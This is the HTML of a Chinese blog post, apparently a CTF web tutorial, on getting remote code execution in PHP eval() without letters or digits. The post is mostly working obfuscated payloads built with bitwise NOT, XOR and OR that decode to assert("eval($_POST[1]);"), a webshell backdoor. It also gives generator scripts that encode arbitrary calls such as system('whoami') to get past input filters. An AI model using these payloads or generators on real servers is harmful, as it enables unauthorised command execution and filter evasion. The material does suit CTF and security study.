@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - PHP无字母数字RCE 或、异或、取反实现</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>PHP无字母数字RCE 或、异或、取反实现</h1>
+    <p>
+        <span class="meta">发布于: 2025-01-21 09:19</span>
+    </p>
+    <div class="post-body">
+        <p>对于CTF web入门php eval代码执行题目，考察无字母数字RCE时，使用<code>取反</code>、<code>异或</code>、<code>或</code>运算，构造payload，实现PHP无字母RCE</p>
+<p>本文中实现方法在一些php版本下语法可能不兼容，不能正常使用，例如在php5.x下，不支持('函数名')('参数')语法</p>
+<p>题目测试环境</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+eval($_GET[1]);</code></pre>
+<!-- more -->
+<p><img src="/images/phprce/5.png" alt="5" /></p>
+<p>似乎利用动态调用函数多一点，例如<code>('函数名')();</code>、<code>('函数名')('参数');</code>，这样来动态调用实现的</p>
+<p>这里直接提供一些测试payload，供测试使用，如果被过滤，可以使用下面脚本自定义生成payload，使用php7.x在线环境[]()</p>
+<p><strong>取反</strong></p>
+<pre><code class="language-php"># payload：assert("eval($_POST[1]);");
+(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+# payload：
+# POST
+1=phpinfo();</code></pre>
+<p><strong>异或</strong></p>
+<pre><code class="language-php"># payload：assert("eval($_POST[1]);");
+(('%bf'^'%de').('%bf'^'%cc').('%bf'^'%cc').('%bf'^'%da').('%bf'^'%cd').('%bf'^'%cb'))(('%bf'^'%da').('%bf'^'%c9').('%bf'^'%de').('%bf'^'%d3').('%df'^'%f7').('%df'^'%fb').('%bf'^'%e0').('%bf'^'%ef').('%bf'^'%f0').('%bf'^'%ec').('%bf'^'%eb').('%bf'^'%e4').('%df'^'%ee').('%bf'^'%e2').('%df'^'%f6').('%df'^'%e4'));
+# POST
+1=phpinfo();</code></pre>
+<p><strong>或</strong></p>
+<pre><code class="language-php"># payload：assert("eval($_POST[1]);");
+(('%61'|'%61').('%73'|'%73').('%73'|'%73').('%65'|'%65').('%72'|'%72').('%74'|'%74'))(('%65'|'%65').('%76'|'%76').('%61'|'%61').('%6c'|'%6c').('%28'|'%28').('%24'|'%24').('%5f'|'%5f').('%50'|'%50').('%4f'|'%4f').('%53'|'%53').('%54'|'%54').('%5b'|'%5b').('%31'|'%31').('%5d'|'%5d').('%29'|'%29'));
+# POST
+1=phpinfo();</code></pre>
+<h2>取反</h2>
+<p>测试发现，取反的payload，8.x版本好像不行</p>
+<p>示例payload</p>
+<pre><code class="language-php">assert("eval($_POST[1]);");
+# 把上面语句转换成payload
+(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
+# POST
+1=phpinfo();</code></pre>
+<p><img src="/images/phprce/1.png" alt="1" /></p>
+<p>取反构造脚本</p>
+<pre><code class="language-php">&lt;?php
+# 测试用
+$cmd = "phpinfo";
+echo "(~" . urlencode(~$cmd). ")();";
+echo "\n";
+# (~%8F%97%8F%96%91%99%90)();
+
+# 构造
+$func = "assert";
+$params = "system('whoami')";
+# 取反
+$func = "(~" . urlencode(~$func) . ")";
+$params = "(~" . urlencode(~$params) . ");";
+echo $func . $params;</code></pre>
+<p>生成payload</p>
+<p><img src="/images/phprce/2.png" alt="2" /></p>
+<h2>异或</h2>
+<p>示例payload</p>
+<pre><code class="language-php">assert("eval($_POST[1]);");
+# payload
+(('%bf'^'%de').('%bf'^'%cc').('%bf'^'%cc').('%bf'^'%da').('%bf'^'%cd').('%bf'^'%cb'))(('%bf'^'%da').('%bf'^'%c9').('%bf'^'%de').('%bf'^'%d3').('%df'^'%f7').('%df'^'%fb').('%bf'^'%e0').('%bf'^'%ef').('%bf'^'%f0').('%bf'^'%ec').('%bf'^'%eb').('%bf'^'%e4').('%df'^'%ee').('%bf'^'%e2').('%df'^'%f6').('%df'^'%e4'));
+# POST
+1=phpinfo();</code></pre>
+<p><img src="/images/phprce/3.png" alt="3" /></p>
+<p>写一个脚本，通过不可见字符，异或运算，先构造出可见字符a-z0-9以及其他可见字符</p>
+<pre><code class="language-php">&lt;?php
+/*
+ * Author: the0n3
+ * Date: 2025-01-21
+ */
+function x0r() {
+    // 遍历不可见字符 (ASCII 128 到 255)
+    for ($x = 128; $x &lt;= 255; $x++) {
+        for ($y = 128; $y &lt;= 255; $y++) {
+            $result = $x ^ $y;
+            if ($result &gt;= 32 &amp;&amp; $result &lt;= 126) {  // 如果结果是可见字符
+                echo chr($result) . " : '%" . dechex($x) . "'^'%" . dechex($y) . "'\n";
+            }
+        }
+    }
+}
+x0r();
+?&gt;</code></pre>
+<p>把可见字符存储在数组里，方便后续调用</p>
+<pre><code class="language-php">&lt;?php
+function x0r() {
+    $results = [];
+
+    // 遍历不可见字符 (ASCII 128 到 255)
+    for ($x = 128; $x &lt;= 255; $x++) {
+        for ($y = 128; $y &lt;= 255; $y++) {
+            $result = $x ^ $y;  // 计算按位异或
+
+            if ($result &gt;= 32 &amp;&amp; $result &lt;= 126) {
+                $results[] = [
+                    'char' =&gt; chr($result), 
+                    'expr' =&gt; "'%" . dechex($x) . "'^'%" . dechex($y) . "'"
+                ];
+            }
+        }
+    }
+    foreach ($results as $entry) {
+        echo $entry['char'] . " : " . $entry['expr'] . "\n";
+    }
+    return $results;
+}
+
+$res = x0r();
+var_dump($res);
+?&gt;</code></pre>
+<p>稍加处理，得到最终的异或构造任意rce脚本</p>
+<pre><code class="language-php">&lt;?php
+# 生成 XOR 对应的可见字符映射
+function x0r() {
+    $results = [];
+
+    for ($x = 128; $x &lt;= 255; $x++) {
+        for ($y = $x; $y &lt;= 255; $y++) {
+        # 避免重复计算
+            $result = $x ^ $y;
+            if ($result &gt;= 32 &amp;&amp; $result &lt;= 126) {
+                $results[chr($result)] = "'%" . dechex($x) . "'^'%" . dechex($y) . "'";
+            }
+        }
+    }
+
+    return $results;
+}
+
+# 将字符替换为 XOR 表达式
+function replaceCharWithXor($mapping, $char) {
+    return isset($mapping[$char]) ? "(" . $mapping[$char] . ")." : $char;
+}
+
+# 拼接整个 payload
+function buildPayload($input, $xorMapping) {
+    $result = '';
+
+    foreach (str_split($input) as $char) {
+        $result .= replaceCharWithXor($xorMapping, $char);
+    }
+
+
+   # 移除最后一个多余的点
+    return rtrim($result, '.');
+}
+
+# 生成 XOR 映射
+$xorMapping = x0r();
+
+# 构造RCE
+$func = "assert";
+$param = "system('whoami')";
+
+# 生成最终的 payload
+$encode_func = buildPayload($func, $xorMapping);
+$encode_param = buildPayload($param, $xorMapping);
+
+$payload = "($encode_func)($encode_param);";
+echo "Payload: " . $payload . "\n";</code></pre>
+<p>生成payload</p>
+<p><img src="/images/phprce/4.png" alt="4" /></p>
+<h2>或</h2>
+<p>示例payload</p>
+<pre><code class="language-php">assert("eval($_POST[1]);");
+# payload
+(('%61'|'%61').('%73'|'%73').('%73'|'%73').('%65'|'%65').('%72'|'%72').('%74'|'%74'))(('%65'|'%65').('%76'|'%76').('%61'|'%61').('%6c'|'%6c').('%28'|'%28').('%24'|'%24').('%5f'|'%5f').('%50'|'%50').('%4f'|'%4f').('%53'|'%53').('%54'|'%54').('%5b'|'%5b').('%31'|'%31').('%5d'|'%5d').('%29'|'%29'));
+# POST
+1=phpinfo();    </code></pre>
+<p><img src="/images/phprce/5.png" alt="5" /></p>
+<p>使用<code>或</code>运算操作，重构实现上面<code>异或</code>脚本的效果</p>
+<pre><code class="language-php">&lt;?php
+# 生成 OR 对应的可见字符映射
+function or_generator() {
+    $results = [];
+
+    for ($x = 32; $x &lt;= 126; $x++) {
+        for ($y = 32; $y &lt;= 126; $y++) {
+            $result = $x | $y;
+            if ($result &gt;= 32 &amp;&amp; $result &lt;= 126) {
+                $results[chr($result)] = "'%" . dechex($x) . "'|'%" . dechex($y) . "'";
+            }
+        }
+    }
+
+    return $results;
+}
+
+# 替换单个字符为 OR 表达式
+function replaceCharWithOr($mapping, $char) {
+    return isset($mapping[$char]) ? "(" . $mapping[$char] . ")." : $char;
+}
+
+# 拼接整个 payload
+function buildPayload($input, $orMapping) {
+    $result = '';
+
+    foreach (str_split($input) as $char) {
+        $result .= replaceCharWithOr($orMapping, $char);
+    }
+
+    # 移除最后一个多余的点
+    return rtrim($result, '.');
+}
+
+# 生成 OR 映射
+$orMapping = or_generator();
+
+# 构造 RCE
+$func = "assert";
+$param = "phpinfo();";
+
+# 生成最终的 payload
+$encode_func = buildPayload($func, $orMapping);
+$encode_param = buildPayload($param, $orMapping);
+
+$payload = "($encode_func)($encode_param);";
+echo "Payload: " . $payload . "\n";</code></pre>
+<p>生成payload</p>
+<p><img src="/images/phprce/6.png" alt="6" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>web</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#php</span>
+                                    <span>#RCE</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
